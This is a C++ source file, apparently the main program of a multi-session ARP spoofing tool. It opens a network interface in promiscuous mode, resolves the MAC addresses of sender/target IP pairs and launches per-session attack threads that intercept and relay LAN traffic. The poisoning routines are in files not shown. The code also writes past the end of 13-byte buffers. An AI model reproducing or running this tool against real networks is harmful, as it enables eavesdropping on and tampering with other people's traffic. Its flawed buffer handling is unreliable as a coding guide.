#include "stdafx.h"
using namespace std;

pthread_t thread[PTHREAD_NUM];
pthread_t attack_thread[PTHREAD_NUM];
int num_of_parameter = 0;
pcap_t* handle;

void terminate_Process(int sig){
    if(sig == SIGINT){
        for(int i = 0; i < num_of_parameter; i++){
            pthread_join(thread[i], NULL);
            pthread_join(attack_thread[i], NULL);
        }
        pcap_close(handle);
    }
}

char* make_Parameter_REQ(int num, char* at_ip_addr, char* at_mac_addr, char* ip, pcap_t* handles){
    struct Parameter_Pthread* pt2 = (struct Parameter_Pthread*)malloc(sizeof(struct Parameter_Pthread));
    char* temp_mac = (char*)malloc(sizeof(char) * 20);
    if(temp_mac == NULL){ perror("mac malloc error"); exit(1); }

    strncpy(pt2->sip, at_ip_addr, 16);
    strncpy(pt2->smac, at_mac_addr, 12);
    pt2->smac[13] = '\0';
    strncpy(pt2->tip, ip, 16);
    pt2->handle = handles;
    pt2->session_Number = num;

    pthread_create(&thread[num], NULL, find_Mac, (void*)(pt2));
    pthread_join(thread[num], (void**)(&temp_mac));
    return temp_mac;
}


// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// argv[1] : device
// argv[2] : sender ip1 / argv[3] : target ip1
// argv[4] : sender ip2 / argv[5] : target ip2
// ...
int main(int argc, char* argv[]) {
    if(argc < 3){
        usage(argv[1]);
        perror("Wrong Parameter!");
        exit(0);
    }

    num_of_parameter = (argc-1)/2;
    if(num_of_parameter > SESSION_NUM){
        perror("Overflow of Session!");
        exit(0);
    }
    printf("[ NUM_OF_PRARMETER : %d ]\n", num_of_parameter);

    char* dev = argv[1];
    printf("[ dev : %s ]\n", dev);

// ########## Set sigaction fuction for SIGINT(ctrl + c) ##########
    struct sigaction sa;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sa.sa_handler = terminate_Process;
    if(sigaction(SIGINT, &sa, NULL) == -1){
        perror("sigaction error");
        exit(0);
    }

// ########## Make a pcap environment ##########
    char errbuf[PCAP_ERRBUF_SIZE];
    int cnt = 2;

    // P Mode
    handle = pcap_open_live(dev, BUFSIZ, PROMISCUOUS_MODE, 100, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "handle couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    cnt = 2;
// ########################################

// ########## Find my IP & MAC address ##########
    char* a_mac_addr = (char*)malloc(13);
    if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
    char* s_ip_addr = (char*)malloc(16);
    if(s_ip_addr == NULL){ perror("s_ip_addr malloc error"); exit(1); }
    struct Info_mymac* IM = find_My_Mac();
    strncpy(a_mac_addr, IM->my_mac, 12);
    a_mac_addr[13] = '\0';
    strncpy(s_ip_addr, IM->my_ip, 16);
    a_mac_addr[strlen(a_mac_addr)] = '\0';
    s_ip_addr[strlen(s_ip_addr)] = '\0';
    printf("[ Success to find my mac address : %s ]\n", a_mac_addr);
// ########################################

// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@ Management of Sessions @@@@@@@@@
    char* smac[num_of_parameter];
    char* dmac[num_of_parameter];

    Session s[SESSION_NUM];
    for(int i = 0; i < num_of_parameter; i++){
        // Find mac using pcap_sendpacket
        smac[i] = (char*)malloc(13);
        if(smac[i] == NULL){ perror("smac malloc error"); exit(1); }
        char* t_smac = (char*)malloc(13);
        if(t_smac == NULL){ perror("t_mac malloc error"); exit(1); }
        t_smac = make_Parameter_REQ(i+1, s_ip_addr, a_mac_addr, argv[cnt], handle);
        smac[i] = t_smac;
        smac[i][13] = '\0';
        printf("[ < Session %d > Success to find < %s > mac address : %s ]\n", i+1, argv[cnt], smac[i]);

        dmac[i] = (char*)malloc(13);
        if(dmac[i] == NULL){ perror("dmac malloc error"); exit(1); }
        char* t_dmac = (char*)malloc(13);
        if(t_dmac == NULL){ perror("t_mac malloc error"); exit(1); }
        t_dmac = make_Parameter_REQ(i+1, s_ip_addr, a_mac_addr, argv[cnt+1], handle);
        dmac[i] = t_dmac;
        dmac[i][13] = '\0';
        printf("[ < Session %d > Success to find < %s > mac address : %s ]\n", i+1, argv[cnt+1], dmac[i]);
        printf("[ Session %d / smac : %s ]\n", i, smac[i]);
        printf("[ Session %d / dmac : %s ]\n\n", i, dmac[i]);
        cnt += 2;
    }

    cnt = 2;
    struct Parameter_Pthread* pt[num_of_parameter];
    for(int i = 0; i < num_of_parameter; i++){
        pt[i] = (struct Parameter_Pthread*)malloc(sizeof(struct Parameter_Pthread));
        // ########## Make contents of Attack parameters ##########
        strncpy(pt[i]->sip, argv[cnt+1], 16);
        strncpy(pt[i]->smac, a_mac_addr, 12);
        pt[i]->smac[13] = '\0';

        strncpy(pt[i]->tip, argv[cnt], 16);
        strncpy(pt[i]->tmac, smac[i], 12);
        pt[i]->tmac[13] = '\0';

        pt[i]->handle = handle;
        pt[i]->session_Number = i+1;
        // ########################################

        // ########## Attack ##########
        s[i].set(i+1, smac[i], argv[cnt], dmac[i], argv[cnt+1], handle, a_mac_addr, pt[i], attack_thread[i]);
        // ########################################
        cnt += 2;
    }

    while(1){
        for(int i = 0; i < num_of_parameter; i++){
           s[i].handle_session();
        }
    }
}




